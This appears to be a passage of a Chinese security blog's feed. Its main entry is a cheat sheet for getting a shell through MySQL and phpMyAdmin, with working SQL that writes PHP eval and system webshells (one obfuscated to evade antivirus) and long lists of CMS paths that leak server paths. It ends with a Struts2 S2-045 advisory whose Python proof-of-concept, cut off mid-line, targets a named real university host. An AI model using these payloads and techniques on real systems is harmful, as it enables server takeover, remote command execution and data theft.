    <content type="html"><![CDATA[<h3 id="看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我"><a href="#看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我" class="headerlink" title="看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~"></a>看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~</h3><h1 id="低权限读文件"><a href="#低权限读文件" class="headerlink" title="低权限读文件"></a>低权限读文件</h1><h3 id="用到的mysql语句"><a href="#用到的mysql语句" class="headerlink" title="用到的mysql语句"></a>用到的mysql语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">'C:/mysql/data/mysql/user.MYD'</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> <span class="keyword">test</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">''</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\0'</span>;</div></pre></td></tr></table></figure>
<h3 id="LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件"><a href="#LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件" class="headerlink" title="LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件"></a>LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件</h3><pre><code>webshell 中如果能读取 user.MYD 文件 ，LOAD DATA LOCAL INFILE 就能读该文件
若webshell 中不能读取 user.MYD文件，LOAD DATA LOCAL INFILE  就不能读该文件
</code></pre><h3 id="使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD"><a href="#使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD" class="headerlink" title="使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD"></a>使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h1 id="SQL语句利用日志写shell"><a href="#SQL语句利用日志写shell" class="headerlink" title="SQL语句利用日志写shell"></a>SQL语句利用日志写shell</h1><p>outfile被禁止，或者写入文件被拦截；</p>
<p>在数据库中操作如下：（必须是root权限）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;%general%&apos;;  #查看配置</div><div class="line">set global general_log = on;  #开启general log模式</div><div class="line">set global general_log_file = &apos;/var/www/html/1.php&apos;;   #设置日志目录为shell地址</div><div class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;  #写入shell</div></pre></td></tr></table></figure>
<p>SQL查询免杀shell的语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;"</span></div></pre></td></tr></table></figure>
<h1 id="getshell-方法"><a href="#getshell-方法" class="headerlink" title="getshell 方法"></a>getshell 方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">方法一：</div><div class="line">CREATE TABLE `mysql`.`io` (`ioi` TEXT NOT NULL );</div><div class="line">INSERT INTO `mysql`.`io` (`ioi` )VALUES (&apos;&lt;?php @eval($_POST[io])?&gt;&apos;);</div><div class="line">SELECT xiaomaFROM study INTO OUTFILE &apos;E:/wamp/www/1.php&apos;;</div><div class="line">#以上同时执行，在数据库: mysql 下创建一个表名为：io，字段为ioi，导出到E:/wamp/www/1.php</div><div class="line"></div><div class="line">一句话连接密码：io</div><div class="line">方法二：</div><div class="line">Create TABLE io (ioi text NOT NULL);</div><div class="line">Insert INTO io (ioi) VALUES(&apos;&lt;?php eval($_POST[io])?&gt;&apos;);</div><div class="line">select ioi from io into outfile &apos;E:/wamp/www/1.php&apos;;</div><div class="line">Drop TABLE IF EXISTS ioi;</div><div class="line"></div><div class="line"></div><div class="line">方法三：</div><div class="line">读取文件内容： select load_file(&apos;E:/xamp/www/s.php&apos;);</div><div class="line"></div><div class="line"></div><div class="line">写一句话：select &apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;INTO OUTFILE &apos;E:/xamp/www/1.php&apos;</div><div class="line"></div><div class="line"></div><div class="line">cmd执行权限：select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/xamp/www/1.php&apos;</div><div class="line"></div><div class="line">select load_file(&apos;E:/xamp/www/xiaoma.php&apos;);</div><div class="line"></div><div class="line">方法四：</div><div class="line">select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/xamp/www/xiaoma.php&apos;</div><div class="line">然后访问网站目录：http://www.xxxx.com/xiaoma.php?cmd=dir</div></pre></td></tr></table></figure>
<h1 id="php爆绝对路径方法"><a href="#php爆绝对路径方法" class="headerlink" title="php爆绝对路径方法"></a>php爆绝对路径方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div></pre></td><td class="code"><pre><div class="line">1、单引号爆路径</div><div class="line">说明：</div><div class="line">直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。</div><div class="line">www.xxx.com/news.php?id=149′</div><div class="line"></div><div class="line"></div><div class="line">2、错误参数值爆路径</div><div class="line">说明：</div><div class="line">将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。</div><div class="line">www.xxx.com/researcharchive.php?id=-1</div><div class="line"></div><div class="line"></div><div class="line">3、Google爆路径</div><div class="line">说明：</div><div class="line">结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</div><div class="line">Site:xxx.edu.tw warning</div><div class="line">Site:xxx.com.tw “fatal error”</div><div class="line"></div><div class="line"></div><div class="line">4、测试文件爆路径</div><div class="line">说明：</div><div class="line">很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。</div><div class="line">www.xxx.com/test.php</div><div class="line">www.xxx.com/ceshi.php</div><div class="line">www.xxx.com/info.php</div><div class="line">www.xxx.com/phpinfo.php</div><div class="line">www.xxx.com/php_info.php</div><div class="line">www.xxx.com/1.php</div><div class="line"></div><div class="line"></div><div class="line">5、phpmyadmin爆路径</div><div class="line">说明：</div><div class="line">一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。</div><div class="line">1. /phpmyadmin/libraries/lect_lang.lib.php</div><div class="line">2./phpMyAdmin/index.php?lang[]=1</div><div class="line">3. /phpMyAdmin/phpinfo.php</div><div class="line">4. load_file()</div><div class="line">5./phpmyadmin/themes/darkblue_orange/layout.inc.php</div><div class="line">6./phpmyadmin/libraries/select_lang.lib.php</div><div class="line">7./phpmyadmin/libraries/lect_lang.lib.php</div><div class="line">8./phpmyadmin/libraries/mcrypt.lib.php</div><div class="line"></div><div class="line"></div><div class="line">6、配置文件找路径</div><div class="line">说明：</div><div class="line">如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</div><div class="line"></div><div class="line"></div><div class="line">Windows:</div><div class="line">c:\windows\php.ini php配置文件</div><div class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</div><div class="line"></div><div class="line"></div><div class="line">Linux:</div><div class="line">/etc/php.ini php配置文件</div><div class="line">/etc/httpd/conf.d/php.conf</div><div class="line">/etc/httpd/conf/httpd.conf Apache配置文件</div><div class="line">/usr/local/apache/conf/httpd.conf</div><div class="line">/usr/local/apache2/conf/httpd.conf</div><div class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</div><div class="line"></div><div class="line"></div><div class="line">7、nginx文件类型错误解析爆路径</div><div class="line">说明：</div><div class="line">要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径</div><div class="line">www.xxx.com/xx.jpg/x.php</div><div class="line"></div><div class="line"></div><div class="line">8、其他</div><div class="line">dedecms</div><div class="line">/member/templets/menulit.php</div><div class="line">plus/paycenter/alipay/return_url.php </div><div class="line">plus/paycenter/cbpayment/autoreceive.php</div><div class="line">paycenter/nps/config_pay_nps.php</div><div class="line">plus/task/dede-maketimehtml.php</div><div class="line">plus/task/dede-optimize-table.php</div><div class="line">plus/task/dede-upcache.php</div><div class="line"></div><div class="line"></div><div class="line">WP</div><div class="line">wp-admin/includes/file.php</div><div class="line">wp-content/themes/baiaogu-seo/footer.php</div><div class="line"></div><div class="line"></div><div class="line">ecshop商城系统暴路径漏洞文件</div><div class="line">/api/cron.php</div><div class="line">/wap/goods.php</div><div class="line">/temp/compiled/ur_here.lbi.php</div><div class="line">/temp/compiled/pages.lbi.php</div><div class="line">/temp/compiled/user_transaction.dwt.php</div><div class="line">/temp/compiled/history.lbi.php</div><div class="line">/temp/compiled/page_footer.lbi.php</div><div class="line">/temp/compiled/goods.dwt.php</div><div class="line">/temp/compiled/user_clips.dwt.php</div><div class="line">/temp/compiled/goods_article.lbi.php</div><div class="line">/temp/compiled/comments_list.lbi.php</div><div class="line">/temp/compiled/recommend_promotion.lbi.php</div><div class="line">/temp/compiled/search.dwt.php</div><div class="line">/temp/compiled/category_tree.lbi.php</div><div class="line">/temp/compiled/user_passport.dwt.php</div><div class="line">/temp/compiled/promotion_info.lbi.php</div><div class="line">/temp/compiled/user_menu.lbi.php</div><div class="line">/temp/compiled/message.dwt.php</div><div class="line">/temp/compiled/admin/pagefooter.htm.php</div><div class="line">/temp/compiled/admin/page.htm.php</div><div class="line">/temp/compiled/admin/start.htm.php</div><div class="line">/temp/compiled/admin/goods_search.htm.php</div><div class="line">/temp/compiled/admin/index.htm.php</div><div class="line">/temp/compiled/admin/order_list.htm.php</div><div class="line">/temp/compiled/admin/menu.htm.php</div><div class="line">/temp/compiled/admin/login.htm.php</div><div class="line">/temp/compiled/admin/message.htm.php</div><div class="line">/temp/compiled/admin/goods_list.htm.php</div><div class="line">/temp/compiled/admin/pageheader.htm.php</div><div class="line">/temp/compiled/admin/top.htm.php</div><div class="line">/temp/compiled/top10.lbi.php</div><div class="line">/temp/compiled/member_info.lbi.php</div><div class="line">/temp/compiled/bought_goods.lbi.php</div><div class="line">/temp/compiled/goods_related.lbi.php</div><div class="line">/temp/compiled/page_header.lbi.php</div><div class="line">/temp/compiled/goods_script.html.php</div><div class="line">/temp/compiled/index.dwt.php</div><div class="line">/temp/compiled/goods_fittings.lbi.php</div><div class="line">/temp/compiled/myship.dwt.php</div><div class="line">/temp/compiled/brands.lbi.php</div><div class="line">/temp/compiled/help.lbi.php</div><div class="line">/temp/compiled/goods_gallery.lbi.php</div><div class="line">/temp/compiled/comments.lbi.php</div><div class="line">/temp/compiled/myship.lbi.php</div><div class="line">/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php</div><div class="line">/includes/modules/cron/auto_manage.php</div><div class="line">/includes/modules/cron/ipdel.php</div><div class="line"></div><div class="line"></div><div class="line">ucenter爆路径</div><div class="line">ucenter\control\admin\db.php</div><div class="line"></div><div class="line"></div><div class="line">DZbbs</div><div class="line">manyou/admincp.php?my_suffix=%0A%0DTOBY57</div><div class="line"></div><div class="line"></div><div class="line">z-blog</div><div class="line">admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</div><div class="line"></div><div class="line"></div><div class="line">php168爆路径</div><div class="line">admin/inc/hack/count.php?job=list</div><div class="line">admin/inc/hack/search.php?job=getcode</div><div class="line">admin/inc/ajax/bencandy.php?job=do</div><div class="line">cache/MysqlTime.txt</div><div class="line"></div><div class="line"></div><div class="line">PHPcms2008-sp4</div><div class="line">注册用户登陆后访问</div><div class="line">phpcms/corpandresize/process.php?pic=../images/logo.gif</div><div class="line"></div><div class="line"></div><div class="line">bo-blog</div><div class="line">PoC:</div><div class="line">/go.php/&lt;[evil code]</div><div class="line">CMSeasy爆网站路径漏洞</div><div class="line">漏洞出现在menu_top.php这个文件中</div><div class="line">lib/mods/celive/menu_top.php</div><div class="line">/lib/default/ballot_act.php</div><div class="line">lib/default/special_act.php</div></pre></td></tr></table></figure>
<h2 id="相关文章链接"><a href="#相关文章链接" class="headerlink" title="相关文章链接"></a>相关文章链接</h2><p><a href="https://www.t00ls.net/articles-26813.html" target="_blank" rel="external">低权限读文件</a><br><a href="http://blog.cora-lab.org/287.html" target="_blank" rel="external">SQL语句利用日志写shell</a><br><a href="http://www.cnblogs.com/devi1o/articles/5179206.html" target="_blank" rel="external">phpmyadmin获取shell方法总结</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我&quot;&gt;&lt;a href=&quot;#看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我&quot; class=&quot;headerlink&quot; title=&quot;看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~&quot;&gt;&lt;/a&gt;看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~&lt;/h3&gt;&lt;h1 id=&quot;低权限读文件&quot;&gt;&lt;a href=&quot;#低权限读文件&quot; class=&quot;headerlink&quot; title=&quot;低权限读文件&quot;&gt;&lt;/a&gt;低权限读文件&lt;/h1&gt;&lt;h3 id=&quot;用到的mysql语句&quot;&gt;&lt;a href=&quot;#用到的mysql语句&quot; class=&quot;headerlink&quot; title=&quot;用到的mysql语句&quot;&gt;&lt;/a&gt;用到的mysql语句&lt;/h3&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;LOAD&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;DATA&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;LOCAL&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INFILE&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;C:/mysql/data/mysql/user.MYD&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;terminated&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;by&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;LINES&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TERMINATED&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件&quot;&gt;&lt;a href=&quot;#LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件&quot; class=&quot;headerlink&quot; title=&quot;LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件&quot;&gt;&lt;/a&gt;LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;webshell 中如果能读取 user.MYD 文件 ，LOAD DATA LOCAL INFILE 就能读该文件
若webshell 中不能读取 user.MYD文件，LOAD DATA LOCAL INFILE  就不能读该文件
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD&quot;&gt;&lt;a href=&quot;#使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD&quot; class=&quot;headerlink&quot; title=&quot;使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD&quot;&gt;&lt;/a&gt;使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="phpmyadmin" scheme="http://iosmosis.github.io/tags/phpmyadmin/"/>
    
      <category term="Getshell" scheme="http://iosmosis.github.io/tags/Getshell/"/>
    
      <category term="mysql" scheme="http://iosmosis.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>不如慢慢走下去</title>
    <link href="http://iosmosis.github.io/2017/04/07/Time/"/>
    <id>http://iosmosis.github.io/2017/04/07/Time/</id>
    <published>2017-04-07T04:47:01.000Z</published>
    <updated>2017-04-08T16:46:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07&lt;/p&gt;

    
    </summary>
    
    
      <category term="About Me" scheme="http://iosmosis.github.io/tags/About-Me/"/>
    
      <category term="随笔" scheme="http://iosmosis.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</title>
    <link href="http://iosmosis.github.io/2017/03/07/str2-045/"/>
    <id>http://iosmosis.github.io/2017/03/07/str2-045/</id>
    <published>2017-03-07T07:02:56.000Z</published>
    <updated>2017-04-08T15:14:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><br></p>
<h3 id="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"><a href="#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。" class="headerlink" title="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"></a>近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。</h3><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><h3 id="S2-045，CVE-2017-5638"><a href="#S2-045，CVE-2017-5638" class="headerlink" title="S2-045，CVE-2017-5638"></a>S2-045，CVE-2017-5638</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><h3 id="基于-Jakarta-plugin插件的Struts远程代码执行漏洞"><a href="#基于-Jakarta-plugin插件的Struts远程代码执行漏洞" class="headerlink" title="基于 Jakarta plugin插件的Struts远程代码执行漏洞"></a>基于 Jakarta plugin插件的Struts远程代码执行漏洞</h3><h2 id="官方评级"><a href="#官方评级" class="headerlink" title="官方评级"></a>官方评级</h2><h3 id="高危"><a href="#高危" class="headerlink" title="高危"></a>高危</h3><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"><a href="#Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令" class="headerlink" title="Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"></a>Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</h3><h2 id="漏洞利用条件和方式"><a href="#漏洞利用条件和方式" class="headerlink" title="漏洞利用条件和方式"></a>漏洞利用条件和方式</h2><h3 id="黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。"><a href="#黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。" class="headerlink" title="黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。"></a>黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</h3><p>1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能<br>2.恶意攻击者精心构造Content-Type的值</p>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><h3 id="Struts-2-3-5-–-Struts-2-3-31"><a href="#Struts-2-3-5-–-Struts-2-3-31" class="headerlink" title="Struts 2.3.5 – Struts 2.3.31"></a>Struts 2.3.5 – Struts 2.3.31</h3><pre><code>Struts 2.5 – Struts 2.5.10
Created by Lukasz Lenart, last modified yesterday at 01:14 PM
</code></pre><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> poster.encode <span class="keyword">import</span> multipart_encode</div><div class="line"><span class="keyword">from</span> poster.streaminghttp <span class="keyword">import</span> register_openers</div><div class="line"></div><div class="line">header1 =&#123;</div><div class="line"><span class="string">"Host"</span>:<span class="string">"alumnus.shu.edu.cn"</span>,</div><div class="line"><span class="string">"Connection"</span>:<span class="string">"keep-alive"</span>,</div><div class="line"><span class="string">"Refer"</span>:<span class="string">"alumnus.shu.edu.cn"</span>,</div><div class="line"><span class="string">"Accept"</span>:<span class="string">"*/*"</span>,</div><div class="line"><span class="string">"X-Requested-With"</span>:<span class="string">"XMLHttpRequest"</span>,</div><div class="line"><span class="string">"Accept-Encoding"</span>:<span class="string">"deflate"</span>,</div><div class="line"><span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</div><div class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 